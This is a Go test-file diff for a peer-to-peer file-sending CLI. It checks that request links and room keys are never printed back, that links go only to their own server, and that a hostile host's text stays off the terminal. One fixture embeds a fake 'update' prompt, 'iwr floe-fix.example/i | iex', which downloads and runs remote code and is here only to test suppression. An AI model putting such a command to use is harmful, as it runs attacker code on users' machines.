@@ -569,6 +569,13 @@ type cliRun struct {
 // every CLI run in this build sets it.
 func startCLI(t *testing.T, args ...string) *cliRun {
 	t.Helper()
+	return startCLIEnv(t, nil, args...)
+}
+
+// startCLIEnv is startCLI with env set in the environment after the reset,
+// as the user's shell would hold it (FLOE_SERVER, say).
+func startCLIEnv(t *testing.T, env map[string]string, args ...string) *cliRun {
+	t.Helper()
 	resetSharedFlags(t)
 	to := sendCmd.Flags().Lookup("to")
 	if err := to.Value.Set(""); err != nil {
@@ -584,6 +591,18 @@ func startCLI(t *testing.T, args ...string) *cliRun {
 		to.Changed = false
 	})
 	t.Setenv("FLOE_NO_STATS", "1")
+	// A request-link send turns pion's pc scope off in the process
+	// environment (quietPeerConnectionLog); each run gives it back.
+	for _, k := range []string{"PION_LOG_DISABLE", "PIONS_LOG_DISABLE"} {
+		v, ok := os.LookupEnv(k)
+		t.Setenv(k, v)
+		if !ok {
+			os.Unsetenv(k)
+		}
+	}
+	for k, v := range env {
+		t.Setenv(k, v)
+	}
 	rootCmd.SetOut(nil)
 	rootCmd.SetErr(nil)
 	rootCmd.SetArgs(append([]string{"send"}, args...))
@@ -629,9 +648,17 @@ func runCLI(t *testing.T, args ...string) *cliRun {
 	return startCLI(t, args...).wait(t, 90*time.Second)
 }
 
-// linkFor is a request link on floe.one for a fresh room; the fake server
-// never checks the id, and --server is always typed beside it.
+// linkFor is a request link on a self-hosted server for a fresh room; the
+// fake server never checks the id, and --server is always typed beside it. A
+// floe.one link would end on TL-10 beside any server but api.floe.one (FU-46,
+// F5-4), so the tests that run against the fake use another host.
 func linkFor() string {
+	return "https://files.example.com/floe/r/Xk3p9Q0aB1c#" + uuid.New().String()
+}
+
+// floeLinkFor is a request link on floe.one for a fresh room, for the tests
+// that run with no server chosen (the stubbed network refuses api.floe.one).
+func floeLinkFor() string {
 	return "https://floe.one/r/Xk3p9Q0aB1c#" + uuid.New().String()
 }
 
@@ -922,8 +949,8 @@ func TestSendToLabelJoinsTypedPaths(t *testing.T) {
 	oneFile(t, dir, filepath.Join("shoot", "c.bin"), 3000)
 	shoot := filepath.Join(dir, "shoot")
 	// No ICE fetch is allowed, so the command ends on TL-10 right after
-	// START, before any network.
-	r := runCLI(t, a, shoot, "--to", linkFor()).read(o)
+	// START, before any network. A floe.one link, since no server is chosen.
+	r := runCLI(t, a, shoot, "--to", floeLinkFor()).read(o)
 	wantOutcome(t, r, tlSetupFailed)
 	want := "\n  Sending   " + a + ", " + shoot + " (3 files, " + transfer.FormatBytes(6000) + ")\n"
 	if !strings.Contains(r.stdout, want) {
@@ -1057,22 +1084,21 @@ func TestSendToIncompleteLinkMakesNoNetworkCall(t *testing.T) {
 // which quotes the path it could not read and so printed the link back,
 // room id and all. A missing path that is not a link keeps TL-32's sentence.
 func TestSendToLinkTypedAsAPathIsNeverPrintedBack(t *testing.T) {
-	t.Run("a link where the path goes", func(t *testing.T) {
-		o := captureOutput(t)
-		net := stubNetwork(t, "")
-		const linkID = "Xk3p9Q0aB1c"
-		room := uuid.New().String()
-		r := runCLI(t, "--to", filepath.Join(t.TempDir(), "shoot"), "https://floe.one/r/"+linkID+"#"+room).read(o)
-		wantOutcome(t, r, "This link looks incomplete. Copy the whole link again, including everything after the # sign. Put the link in quotes.")
-		for _, leak := range []string{room, linkID, "cannot read"} {
-			if strings.Contains(r.stdout+r.stderr, leak) {
-				t.Fatalf("%q was printed:\nstdout:\n%s\nstderr:\n%s", leak, r.stdout, r.stderr)
+	room := uuid.New().String()
+	// FU-46 (FU-32 F5-3): every shape that carries the key, not only the ones
+	// code.ParseRequestLink takes.
+	for name, link := range linkAsPathShapes(room) {
+		t.Run("a link where the path goes: "+name, func(t *testing.T) {
+			o := captureOutput(t)
+			net := stubNetwork(t, "")
+			r := runCLI(t, "--to", filepath.Join(t.TempDir(), "shoot"), link).read(o)
+			wantNoLinkEcho(t, r, room)
+			wantOutcome(t, r, "This link looks incomplete. Copy the whole link again, including everything after the # sign. Put the link in quotes.")
+			if net.ice.Load() != 0 || net.connect.Load() != 0 {
+				t.Fatalf("network calls made: ICE %d, connect %d", net.ice.Load(), net.connect.Load())
 			}
-		}
-		if net.ice.Load() != 0 || net.connect.Load() != 0 {
-			t.Fatalf("network calls made: ICE %d, connect %d", net.ice.Load(), net.connect.Load())
-		}
-	})
+		})
+	}
 	t.Run("a missing path", func(t *testing.T) {
 		o := captureOutput(t)
 		net := stubNetwork(t, "")
@@ -1087,11 +1113,144 @@ func TestSendToLinkTypedAsAPathIsNeverPrintedBack(t *testing.T) {
 	})
 }
 
+// linkAsPathShapes are a request link as it can be typed where a path goes,
+// each carrying room, the link's key (FU-46, FU-32 F5-3). code.ParseRequestLink
+// takes five of them (a whole link, self-hosted, no scheme, capitals, a
+// percent-encoded fragment); the others still carry the room id after a #,
+// which is the rule code.Resolve refuses a request link by (FT-LINK-ECHO-F2,
+// X1 to X4), or after a # that is percent-encoded, once or twice, as a link
+// pasted from a mail-safety redirector is, or doubled, or followed by a space
+// (FU-46 review 1 L2).
+func linkAsPathShapes(room string) map[string]string {
+	return map[string]string{
+		"a whole link":                           "https://floe.one/r/Xk3p9Q0aB1c#" + room,
+		"a self-hosted link":                     "https://files.example.com/floe/r/Xk3p9Q0aB1c/#" + room,
+		"no scheme":                              "floe.one/r/Xk3p9Q0aB1c#" + room,
+		"a link id one character short":          "https://floe.one/r/Xk3p9Q0aB1#" + room,
+		"a link id one character long":           "https://floe.one/r/Xk3p9Q0aB1cD#" + room,
+		"an extra path segment":                  "https://floe.one/r/Xk3p9Q0aB1c/x#" + room,
+		"angle brackets":                         "<https://floe.one/r/Xk3p9Q0aB1c#" + room + ">",
+		"quotes":                                 `"https://floe.one/r/Xk3p9Q0aB1c#` + room + `"`,
+		"the room id in capitals":                "https://floe.one/r/Xk3p9Q0aB1c#" + strings.ToUpper(room),
+		"a percent-encoded fragment":             fmt.Sprintf("https://floe.one/r/Xk3p9Q0aB1c#%%%02X%s", room[0], room[1:]),
+		"a bad escape after the room":            "https://floe.one/r/Xk3p9Q0aB1c#" + room + "%zz",
+		"a percent-encoded #":                    "https://floe.one/r/Xk3p9Q0aB1c%23" + room,
+		"a bad escape, then a percent-encoded #": "https://floe.one/r/Xk3p9Q0aB1c%zz%23" + room,
+		"inside a mail-safety redirector":        "https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Ffloe.one%2Fr%2FXk3p9Q0aB1c%23" + room + "&data=05%7C02",
+		"a redirector inside a redirector":       "https://example.com/?u=https%3A%2F%2Fnam12.safelinks.protection.outlook.com%2F%3Furl%3Dhttps%253A%252F%252Ffloe.one%252Fr%252FXk3p9Q0aB1c%2523" + room,
+		"a doubled #":                            "https://floe.one/r/Xk3p9Q0aB1c##" + room,
+		"a space after the #":                    "https://floe.one/r/Xk3p9Q0aB1c# " + room,
+	}
+}
+
+// TestLooksLikeRequestLink: every shape above is a request link, and nothing
+// without a room id at the start of its fragment is: a room link (#room=),
+// a path with a hash in it, a room id in a file name, a request link that
+// lost its fragment (it carries no key, and keeps the stat sentence).
+func TestLooksLikeRequestLink(t *testing.T) {
+	room := uuid.New().String()
+	for name, link := range linkAsPathShapes(room) {
+		if !looksLikeRequestLink(link) {
+			t.Errorf("%s: looksLikeRequestLink(%q) = false", name, link)
+		}
+	}
+	for _, s := range []string{
+		"",
+		"shoot",
+		"notes#1.txt",
+		room + ".bin",
+		"https://floe.one/#room=" + room,
+		"floe.one/?room=" + room,
+		"https://floe.one/r/Xk3p9Q0aB1c",
+		"https://floe.one/r/Xk3p9Q0aB1c#" + room[:35],
+		"https://floe.one/r/Xk3p9Q0aB1c#x" + room,
+		"https://floe.one/r/Xk3p9Q0aB1c%23x" + room,
+		"https://example.com/?url=https%3A%2F%2Ffloe.one%2F%23room%3D" + room,
+		"notes%231.txt",
+	} {
+		if looksLikeRequestLink(s) {
+			t.Errorf("looksLikeRequestLink(%q) = true", s)
+		}
+	}
+}
+
+// wantNoLinkEcho requires a run to have printed nothing of the link it was
+// given: not the room id (its last 35 characters, so a percent-encoded first
+// one counts too, in any case), not the link id, and not the stat sentence
+// that quotes a path.
+func wantNoLinkEcho(t *testing.T, r *cliRun, room string) {
+	t.Helper()
+	all := strings.ToLower(r.stdout + r.stderr)
+	for _, leak := range []string{strings.ToLower(room[1:]), strings.ToLower("Xk3p9Q0aB1"), "cannot read"} {
+		if strings.Contains(all, leak) {
+			t.Fatalf("%q was printed:\nstdout:\n%s\nstderr:\n%s", leak, r.stdout, r.stderr)
+		}
+	}
+}
+
+// lineLinkAsPath is the line a plain send ends on for a request link typed
+// as a path (FU-46, FU-32 F5-3), approved by the owner as written (D-153,
+// approved-copy-cli.txt), byte for byte.
+const lineLinkAsPath = "That looks like a request link, not a file. To send to it, use: floe send <files> --to <link>"
+
+// TestSendLinkTypedAsAPathIsNeverPrintedBack (FU-46, FU-32 F5-3): a plain
+// send with a request link where a path goes (--to forgotten, the likeliest
+// visitor mistake) ends on one fixed line, before any network, and never on
+// the stat sentence, which quoted the link twice, key and all, into
+// scrollback. A missing path that is not shaped like a link, even one whose
+// name holds a room id, keeps that sentence.
+func TestSendLinkTypedAsAPathIsNeverPrintedBack(t *testing.T) {
+	room := uuid.New().String()
+	shapes := linkAsPathShapes(room)
+	run := func(t *testing.T, args ...string) *cliRun {
+		t.Helper()
+		o := captureOutput(t)
+		stubNetwork(t, "")
+		// A closed port, so a send that went wrong reaches no server.
+		return runCLI(t, append(args, "--server", closedServer)...).read(o)
+	}
+	for name, link := range shapes {
+		t.Run(name, func(t *testing.T) {
+			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
+			r := run(t, p, link)
+			wantNoLinkEcho(t, r, room)
+			if r.err == nil {
+				t.Fatal("the command succeeded; want exit 1")
+			}
+			if r.stdout != "" || r.stderr != "  "+lineLinkAsPath+"\n" {
+				t.Fatalf("want the one line %q on stderr and nothing on stdout\nstdout:\n%q\nstderr:\n%q", lineLinkAsPath, r.stdout, r.stderr)
+			}
+		})
+	}
+	t.Run("the link first", func(t *testing.T) {
+		p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
+		r := run(t, shapes["a whole link"], p)
+		wantNoLinkEcho(t, r, room)
+		if r.err == nil || r.stderr != "  "+lineLinkAsPath+"\n" {
+			t.Fatalf("the command returned %v\nstderr:\n%q", r.err, r.stderr)
+		}
+	})
+	for name, base := range map[string]string{
+		"a missing path":                       "shoot",
+		"a hash with no room id after it":      "notes#1.txt",
+		"a room id in the name, not after a #": room + ".bin",
+	} {
+		t.Run(name, func(t *testing.T) {
+			missing := filepath.Join(t.TempDir(), base)
+			r := run(t, missing)
+			if r.err == nil || !strings.Contains(r.stderr, "Error: cannot read "+missing+": ") {
+				t.Fatalf("a missing path no longer ends on the stat sentence (%v):\n%s", r.err, r.stderr)
+			}
+		})
+	}
+}
+
 // TestSendToOtherServerLinkEndsWithoutANetworkCall is D-144.8's replacement
 // for the card's TestSendToOtherServerLinkNeedsServerFlag: a link made on
 // another server, with no --server and no FLOE_SERVER, ends on TL-10 before
 // any network call, so neither api.floe.one nor any other server learns its
-// room id. A server named either way lets the same link through.
+// room id. A server named either way lets the same link through. A floe.one
+// link goes through only to api.floe.one (FU-46, F5-4).
 func TestSendToOtherServerLinkEndsWithoutANetworkCall(t *testing.T) {
 	o := captureOutput(t)
 	room := uuid.New().String()
@@ -1104,21 +1263,64 @@ func TestSendToOtherServerLinkEndsWithoutANetworkCall(t *testing.T) {
 		t.Fatalf("network calls made: ICE %d, connect %d", net.ice.Load(), net.connect.Load())
 	}
 
+	const (
+		floeServer = "https://api.floe.one"
+		selfHosted = "https://files.example.com"
+	)
+	floe := "https://floe.one/r/Xk3p9Q0aB1c#" + room
 	for _, c := range []struct {
 		link   string
 		chosen bool
+		server string
 		want   bool
 	}{
-		{other, false, true},
-		{other, true, false},
-		{"https://floe.one/r/Xk3p9Q0aB1c#" + room, false, false},
-		{"https://WWW.floe.one/r/Xk3p9Q0aB1c#" + room, false, false},
-		{"floe.one/r/Xk3p9Q0aB1c#" + room, false, false},
-		{"https://floe.one.example.com/r/Xk3p9Q0aB1c#" + room, false, true},
-		{"http://localhost:3000/r/Xk3p9Q0aB1c#" + room, false, true},
+		{other, false, floeServer, true},
+		{other, true, selfHosted, false},
+		{floe, false, floeServer, false},
+		{"https://WWW.floe.one/r/Xk3p9Q0aB1c#" + room, false, floeServer, false},
+		{"floe.one/r/Xk3p9Q0aB1c#" + room, false, floeServer, false},
+		{"https://floe.one./r/Xk3p9Q0aB1c#" + room, false, floeServer, false},
+		{"https://floe.one.example.com/r/Xk3p9Q0aB1c#" + room, false, floeServer, true},
+		{"http://localhost:3000/r/Xk3p9Q0aB1c#" + room, false, floeServer, true},
+		// F5-4: a floe.one link with a server chosen goes through only when
+		// that server is api.floe.one once normalized.
+		{floe, true, floeServer, false},
+		{floe, true, " https://api.floe.one// ", false},
+		{floe, true, selfHosted, true},
+		{floe, true, "http://127.0.0.1:3001", true},
+		{floe, true, "https://floe.one", true},
+		{floe, true, "http://api.floe.one", true},
+		{floe, true, "https://api.floe.one.example.com", true},
+		// N4 (FU-46 review 1): api.floe.one is compared parsed, so every
+		// spelling that reaches it goes through (https in any case, the host
+		// in any case and with one trailing dot, port 443, no path) and
+		// anything else still ends on TL-10.
+		{floe, true, "https://API.floe.one", false},
+		{floe, true, "HTTPS://Api.Floe.One", false},
+		{floe, true, "https://api.floe.one:443", false},
+		{floe, true, "https://api.floe.one.", false},
+		{floe, true, " https://API.FLOE.ONE.:443/ ", false},
+		{floe, true, "http://api.floe.one:443", true},
+		{floe, true, "wss://api.floe.one", true},
+		{floe, true, "api.floe.one", true},
+		{floe, true, "//api.floe.one", true},
+		{floe, true, "https://user@api.floe.one", true},
+		{floe, true, "https://user:secret@api.floe.one", true},
+		{floe, true, "https://api.floe.one:8443", true},
+		{floe, true, "https://api.floe.one:80", true},
+		{floe, true, "https://api.floe.one:", true},
+		{floe, true, "https://api.floe.one/floe", true},
+		{floe, true, "https://api.floe.one?x=1", true},
+		{floe, true, "https://api.floe.one#x", true},
+		{floe, true, "https://api.floe.one..", true},
+		{floe, true, "https://xapi.floe.one", true},
+		{floe, true, "https://floe.one.api.floe.one", true},
+		{"https://www.floe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
+		{"floe.one/r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
+		{"https://floe.one./r/Xk3p9Q0aB1c#" + room, true, selfHosted, true},
 	} {
-		if got := linkServerMismatch(c.link, c.chosen); got != c.want {
-			t.Errorf("linkServerMismatch(%q, %v) = %v, want %v", c.link, c.chosen, got, c.want)
+		if got := linkServerMismatch(c.link, c.chosen, c.server); got != c.want {
+			t.Errorf("linkServerMismatch(%q, %v, %q) = %v, want %v", c.link, c.chosen, c.server, got, c.want)
 		}
 	}
 	// FLOE_SERVER names the server as well as --server does.
@@ -1129,6 +1331,90 @@ func TestSendToOtherServerLinkEndsWithoutANetworkCall(t *testing.T) {
 		return ""
 	}) {
 		t.Fatal("FLOE_SERVER does not count as a chosen server")
+	}
+}
+
+// TestSendToFloeLinkWithAnotherServerEndsWithoutANetworkCall (FU-46, FU-32
+// F5-4): a floe.one link's room lives only on api.floe.one, so a run pointed
+// at any other server (FLOE_SERVER, the standing setting a self-hoster keeps,
+// or --server typed) ends on TL-10 before any network call. That server never
+// sees the ICE fetch or the request-join that would hand it the room id, with
+// which its operator could take the link's one seat on api.floe.one. A server
+// that normalizes to api.floe.one lets the link through to the ICE fetch,
+// which the stub refuses.
+func TestSendToFloeLinkWithAnotherServerEndsWithoutANetworkCall(t *testing.T) {
+	prev := sendToJoinTimeout
+	sendToJoinTimeout = 300 * time.Millisecond
+	t.Cleanup(func() { sendToJoinTimeout = prev })
+	room := uuid.New().String()
+	for _, c := range []struct {
+		name string
+		link string
+		// envServer: FLOE_SERVER is the fake's URL; otherwise --server is.
+		envServer bool
+	}{
+		{"FLOE_SERVER set", "https://floe.one/r/Xk3p9Q0aB1c#" + room, true},
+		{"FLOE_SERVER set, www and no scheme", "www.floe.one/r/Xk3p9Q0aB1c#" + room, true},
+		{"--server typed", "https://WWW.floe.one/r/Xk3p9Q0aB1c#" + room, false},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			o := captureOutput(t)
+			s := newReqServer(t, "none")
+			net := stubNetwork(t, s.URL)
+			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
+			var r *cliRun
+			if c.envServer {
+				r = startCLIEnv(t, map[string]string{"FLOE_SERVER": s.URL}, p, "--to", c.link)
+			} else {
+				r = startCLI(t, p, "--to", c.link, "--server", s.URL)
+			}
+			r.wait(t, 30*time.Second).read(o)
+			if ice, connect := net.ice.Load(), net.connect.Load(); ice != 0 || connect != 0 {
+				t.Fatalf("network calls made: ICE %d, connect %d", ice, connect)
+			}
+			if _, total := s.hitCount("/"); total != 0 {
+				t.Fatalf("the other server was hit %d times", total)
+			}
+			wantOutcome(t, r, tlSetupFailed)
+			if strings.Contains(r.stdout, "Sending") {
+				t.Fatalf("START was printed before the server was checked:\n%s", r.stdout)
+			}
+			if strings.Contains(r.stdout+r.stderr, room) {
+				t.Fatalf("the room id was printed:\nstdout:\n%s\nstderr:\n%s", r.stdout, r.stderr)
+			}
+		})
+	}
+	// Every spelling of api.floe.one reaches the ICE fetch (N4, FU-46 review
+	// 1); nothing else does. Nothing is allowed: the fetch is counted and
+	// refused, never made.
+	for _, c := range []struct {
+		server  string
+		reaches bool
+	}{
+		{" https://api.floe.one/ ", true},
+		{"https://API.floe.one", true},
+		{"https://api.floe.one:443", true},
+		{"https://api.floe.one.", true},
+		{"http://api.floe.one", false},
+		{"https://user@api.floe.one", false},
+		{"https://api.floe.one:8443", false},
+		{"https://api.floe.one.example.com", false},
+	} {
+		t.Run("FLOE_SERVER is "+strings.TrimSpace(c.server), func(t *testing.T) {
+			o := captureOutput(t)
+			net := stubNetwork(t, "")
+			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
+			r := startCLIEnv(t, map[string]string{"FLOE_SERVER": c.server}, p, "--to", floeLinkFor())
+			r.wait(t, 30*time.Second).read(o)
+			wantOutcome(t, r, tlSetupFailed)
+			want := int32(0)
+			if c.reaches {
+				want = 1
+			}
+			if ice, connect := net.ice.Load(), net.connect.Load(); ice != want || connect != 0 {
+				t.Fatalf("ICE fetches %d, connects %d; want %d and 0", ice, connect, want)
+			}
+		})
 	}
 }
 
@@ -1812,6 +2098,61 @@ func TestSendToHostileOfferNeverPrinted(t *testing.T) {
 			}
 		})
 	}
+}
+
+// TestSendToHostUfragWordsNeverReachTheTerminal (FU-46, FU-32 F2-2): a host
+// that trickles, after its offer, a candidate whose ufrag matches nothing in
+// that offer made pion log "pc ERROR: dropping candidate with ufrag <ufrag>"
+// on the visitor's stderr. FU-40's escape turns controls into visible escapes
+// but passes the rest of Latin-1, so words joined with no-break spaces
+// printed as the host's own readable sentence, on the path where D-147 (2)
+// keeps every word a stranger host chooses off the terminal. The candidate
+// goes through the signaling path a real host uses, to the peer runSendTo
+// builds, so this fails if the --to path stops quieting pion's pc scope.
+func TestSendToHostUfragWordsNeverReachTheTerminal(t *testing.T) {
+	o := captureOutput(t)
+	s := newReqServer(t, "seat")
+	stubNetwork(t, s.URL)
+	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
+	const said = "Your Floe needs an update to send to this link. Run: iwr floe-fix.example/i | iex"
+	words := strings.ReplaceAll(said, " ", "\u00a0")
+	h := startHost(t, s, func(h *testHost) error {
+		// The channel is open once offer returns, so the visitor holds the
+		// host's offer and pion checks the candidate's ufrag against it.
+		if err := h.offer(); err != nil {
+			return err
+		}
+		if err := h.sc.SendSignal(map[string]interface{}{"candidate": map[string]interface{}{
+			"candidate": "candidate:1 1 udp 2130706431 192.0.2.1 5000 typ host ufrag " + words,
+			"sdpMid":    "0",
+		}}); err != nil {
+			return err
+		}
+		if _, err := h.awaitMetadata(); err != nil {
+			return err
+		}
+		// A beat for the visitor's pion to take the candidate, which came
+		// over the signaling socket and not the channel, then decline.
+		time.Sleep(500 * time.Millisecond)
+		if err := h.dc.Send([]byte(`{"type":"incompatible","reason":"declined","pv":1,"pvMin":1,"ver":"desktop-test","code":"declined","saved":0}`)); err != nil {
+			return err
+		}
+		h.holdOpen()
+		return nil
+	})
+	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
+	herr := h.wait(t)
+	r.read(o)
+	if herr != nil {
+		t.Fatalf("host: %v", herr)
+	}
+	both := strings.ReplaceAll(r.stdout+r.stderr, "\u00a0", " ")
+	for _, bad := range []string{"floe-fix.example", "Your Floe needs an update to send", "dropping candidate"} {
+		if strings.Contains(both, bad) {
+			t.Fatalf("the host's words reached the terminal (%q):\nstdout:\n%s\nstderr:\n%s", bad, r.stdout, r.stderr)
+		}
+	}
+	wantOutcome(t, r, "They declined. Nothing was sent.")
 }
 
 // ── The clocks ───────────────────────────────────────────────────────────────
